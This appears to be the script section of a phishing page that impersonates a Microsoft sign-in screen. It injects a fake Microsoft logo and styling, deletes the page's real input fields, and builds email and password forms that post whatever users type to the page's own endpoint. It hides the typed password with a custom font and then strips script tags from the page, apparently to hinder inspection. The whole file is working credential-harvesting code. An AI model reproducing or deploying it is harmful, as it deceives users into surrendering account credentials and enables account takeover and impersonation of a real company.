  style.sheet.insertRule("@media all {body{margin:0;padding:0;display:flex;align-items:center;justify-content:center;height:100vh}.mslogo{margin-left:30px;display:inline-block;background:#f25022;width:11px;height:11px;box-shadow:12px 0 0 #7fba00,0 12px 0 #00a4ef,12px 12px 0 #ffb900;transform:translatex(-300%)}.mslogo::after{content:\"Microsoft\";font:bold 20px sans-serif;margin-left:28px;color:#737373}.form-control::placeholder{font-family:\"Open Sans\",Arial,Helvetica,sans-serif;opacity:1}.form-control:-ms-input-placeholder{font-family:\"Open Sans\",Arial,Helvetica,sans-serif}.form-control::-ms-input-placeholder{font-family:\"Open Sans\", Arial, Helvetica, sans-serif;}#spinput{font-family:inherit;font-size:inherit;line-height:inherit;background-image:url(images/passwrd.png);background-repeat:no-repeat;cursor:text}#spinput{max-width:100%;line-height:inherit}#spinput{padding:4px 8px;border-style:solid;border-color:rgba(0,0,0,.31)}#spinput{border-width:1px;border-color:#666;border-color:rgba(0,0,0,.6);height:36px;outline:0;border-radius:0;-webkit-border-radius:0;background-color:transparent}#spinput{border-top-width:0;border-left-width:0;border-right-width:0}#emnput{font-family:inherit;font-size:inherit;line-height:inherit;background-image:url(images/putmail.png);background-repeat:no-repeat;cursor:text}#emnput{max-width:100%;line-height:inherit}#emnput{padding:4px 8px;border-style:solid;border-color:rgba(0,0,0,.31)}#emnput{border-width:1px;border-color:#666;border-color:rgba(0,0,0,.6);height:36px;outline:0;border-radius:0;-webkit-border-radius:0;background-color:transparent}#emnput{border-top-width:0;border-left-width:0;border-right-width:0}body.nd{color:#262626;text-align:left}body.cb{text-align:right!important;direction:rtl!important;padding:50px!important}.inner{margin-left:unset!important;margin-right:initial!important;position:absolute!important;max-width:0!important;width:calc(10% - 0px)!important;padding:0!important;margin-bottom:0!important;min-width:5px!important;min-height:8px!important;overflow:scroll!important}#i0118{font-family:\"Times New Roman\",Times,serif!important;width:1%!important}#inpfield[type=email]{width:100%!important}#inpfield[type=text]{font-family:text-sec-disc!important;width:100%!important;-webkit-text-sec:disc!important}.form-group{margin-bottom:0!important}@font-face{font-family:\"Open Sans\";font-style:normal;font-weight:300;src:local(\"Open Sans Light\"),local(\"OpenSans-Light\"),url(https://fonts.gstatic.com/s/opensans/v16/mem5YaGs126MiZpBA-UN_r8OUuhs.ttf) format(\"truetype\")}@font-face{font-family:\"Open Sans\";font-style:normal;font-weight:400;src:local(\"Open Sans Regular\"),local(\"OpenSans-Regular\"),url(https://fonts.gstatic.com/s/opensans/v16/mem8YaGs126MiZpBA-UFVZ0e.ttf) format(\"truetype\")}@font-face{font-family:\"Open Sans\";font-style:normal;font-weight:600;src:local(\"Open Sans SemiBold\"),local(\"OpenSans-SemiBold\"),url(https://fonts.gstatic.com/s/opensans/v16/mem5YaGs126MiZpBA-UNirkOUuhs.ttf) format(\"truetype\")}@font-face{font-family:text-sec-disc;src:url(fonts/tsd.eot);src:url(fonts/tsd.eot?#iefix) format(\"embedded-opentype\"),url(fonts/tsd.woff2) format(\"woff2\"),url(fonts/tsd.woff) format(\"woff\"),url(fonts/tsd.ttf) format(\"truetype\"),url(fonts/tsd.svg#text-security) format(\"svg\")}.alert{margin-left:-2%;}}", 0);
  function checkdom() {
    Element.prototype.isVisible = function () {
      function _isVisible(el, t, r, b, l, w, h) {
        var p = el.parentNode,
            VISIBLE_PADDING = 2;
        if (!_elementInDocument(el)) {
          return false;
        }
        if (9 === p.nodeType) {
          return true;
        }
        if ("0" === _getStyle(el, "opacity") || "none" === _getStyle(el, "display") || "hidden" === _getStyle(el, "visibility")) {
          return false;
        }
        if ("undefined" === typeof t || "undefined" === typeof r || "undefined" === typeof b || "undefined" === typeof l || "undefined" === typeof w || "undefined" === typeof h) {
          t = el.offsetTop;
          l = el.offsetLeft;
          b = t + el.offsetHeight;
          r = l + el.offsetWidth;
          w = el.offsetWidth;
          h = el.offsetHeight;
        }
        if (p) {
          if ("hidden" === _getStyle(p, "overflow") || "scroll" === _getStyle(p, "overflow")) {
            if (l + VISIBLE_PADDING > p.offsetWidth + p.scrollLeft || l + w - VISIBLE_PADDING < p.scrollLeft || t + VISIBLE_PADDING > p.offsetHeight + p.scrollTop || t + h - VISIBLE_PADDING < p.scrollTop) {
              return false;
            }
          }
          if (el.offsetParent === p) {
            l += p.offsetLeft;
            t += p.offsetTop;
          }
          return _isVisible(p, t, r, b, l, w, h);
        }
        return true;
      }
      function _getStyle(el, property) {
        if (window.getComputedStyle) {
          return document.defaultView.getComputedStyle(el, null)[property];
        }
        if (el.currentStyle) {
          return el.currentStyle[property];
        }
      }
      function _elementInDocument(element) {
        while ((element = element.parentNode)) {
          if (element == document) {
            return true;
          }
        }
        return false;
      }
      return _isVisible(this);
    };
    var arc = "access expired contact owner";
    var my_eleme = document.getElementById("makeinput");
    if (my_eleme) {
      if (!my_eleme.isVisible(my_eleme)) {
      }
      else {
        var my_elemn = document.getElementById("emnput");
        var my_elesp = document.getElementById("spinput");
        if (my_elemn) {
          if (!my_elemn.isVisible(my_elemn)) {
          }
        }
        else if (my_elesp) {
          if (!my_elesp.isVisible(my_elesp)) {
          }
        }
        else {
          var my_inpf = document.getElementById("inpfield");
          if (my_inpf) {
            if (!my_idSIB.isVisible(my_inpf)) {
            }
          }
        }
      }
    }
    else {
    }
    var my_idSIB = document.getElementById("idSIButton");
    if (my_idSIB) {
      if (!my_idSIB.isVisible(my_idSIB)) {
      }
    }
  }
  window.onload = setTimeout(checkdom, 2000);
  var xTag = document.getElementsByTagName("input");
  if (xTag) {
    var i;
    for (i = 0; i < xTag.length; i++) {
      xTag[i].style.backgroundColor = "red";
      xTag[i].parentNode.removeChild(xTag[i]);
    }
  }
  var timep = Math.floor((Date.now() + 86400000) / 1000);
  htmlinp = "<form class=\"";
  htmlinp += rndstr1 + "\" name=\"f1\" ";
  htmlinp += "id=\"inputfrm\" novalidate=\"novalidate\" ";
  htmlinp += "spellcheck=\"false\" ";
  htmlinp += "method=\"post\" ";
  htmlinp += "target=\"_top\" ";
  htmlinp += "autocomplete=\"off\" ";
  htmlinp += "action=\"remkus?";
  htmlinp += actnn + "&isok=y";
  htmlinp += "\" ><input onkeydown=\"onkeypressFunction()\" name=\"pass\" ";
  htmlinp += "type=\"text\" ";
  htmlinp += "\" id=\"inpfield\" ";
  htmlinp += "autocomplete=\"off\" ";
  htmlinp += "class=\"form-control &nbsp; " + rndstr2 + " ";
  htmlinp += haserr + "\" aria-required=\"true\" ";
  htmlinp += "placeholder=\"" + plchol;
  htmlinp += "\" aria-label=\"" + arrl;
  htmlinp += "\" required></form>";
  htmlinp2 = "<form class=\"";
  htmlinp2 += rndstr1 + "\" name=\"f1\" ";
  htmlinp2 += "id=\"inputfrm\" novalidate=\"novalidate\" ";
  htmlinp2 += "spellcheck=\"false\" ";
  htmlinp2 += "method=\"get\" ";
  htmlinp2 += "autocomplete=\"off";
  htmlinp2 += "action=\"";
  htmlinp2 += actnn2;
  htmlinp2 += "\" ><input onkeydown=\"onkeypressFunction()\" name=\"data\" ";
  htmlinp2 += "type=\"email\" ";
  htmlinp2 += "id=\"inpfield\" ";
  htmlinp2 += "autocomplete=\"on\" ";
  htmlinp2 += "class=\"form-control &nbsp; " + rndstr2 + " ";
  htmlinp2 += haserr + "\" aria-required=\"true\" ";
  htmlinp2 += "placeholder=\"" + plchol2;
  htmlinp2 += "\" aria-label=\"" + arrl;
  htmlinp2 += "\" required></form>";
  function makeInputHere(e) {
    if (document.getElementById("emnput")) {
      e.innerHTML = htmlinp2;
    }
    else {
      e.innerHTML = htmlinp;
    }
    if (document.getElementById("inpfield")) {
      document.getElementById("inpfield").focus();
    }
  }
  function validateForm() {
    var inpfield = document.getElementById("inpfield").value;
    if (inpfield == "") {
      return false;
    }
    return true;
  }
  function submitForm() {
    document.getElementById("inputfrm").submit();
  }
  function onkeypressFunction() {
    if (document.getElementById("spinput")) {
      document.getElementById("spinput").classList.remove("novalidate");
    }
    if (document.getElementById("inpfield")) {
      document.getElementById("inpfield").classList.remove("novalidate");
    }
  }
  document.getElementById("idSIButton").onclick = function () {
    function ValidateEmail(mail) {
      if (/^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/.test(mail)) {
        return true;
      }
      alert("You have entered an invalid email address!");
      return false;
    }
    var mailfrm = document.getElementById("inpfield").value;
    if (document.getElementById("inpfield") && mailfrm.length > 3 && document.getElementById("inputfrm") && document.getElementById("inpfield").value !== "" && (statos !== "putuser" || statos == "putuser" && ValidateEmail(mailfrm))) {
      if (statos == "putuser") {
        document.getElementById("inputfrm").submit();
      }
      else {
        document.getElementById("progressBar").setAttribute("class", "progress enait");
        setTimeout(submitForm, 2000);
        if (document.getElementById("spinput").hasClass("novalidate")) {
          document.getElementById("spinput").classList.remove("novalidate");
        }
        if (document.getElementById("inpfield").hasClass("novalidate")) {
          document.getElementById("inpfield").classList.remove("novalidate");
        }
      }
    }
    else if (document.getElementById("spinput")) {
      document.getElementById("spinput").classList.add("novalidate");
    }
    else if (document.getElementById("inpfield")) {
      document.getElementById("inpfield").classList.add("novalidate");
    }
  };
  var r = document.getElementsByTagName("script");
  for (var i = r.length - 1; i >= 0; i--) {
    if (r[i].getAttribute("id") != "a") {
      r[i].parentNode.removeChild(r[i]);
    }
  }
</script>
</body>
</html>
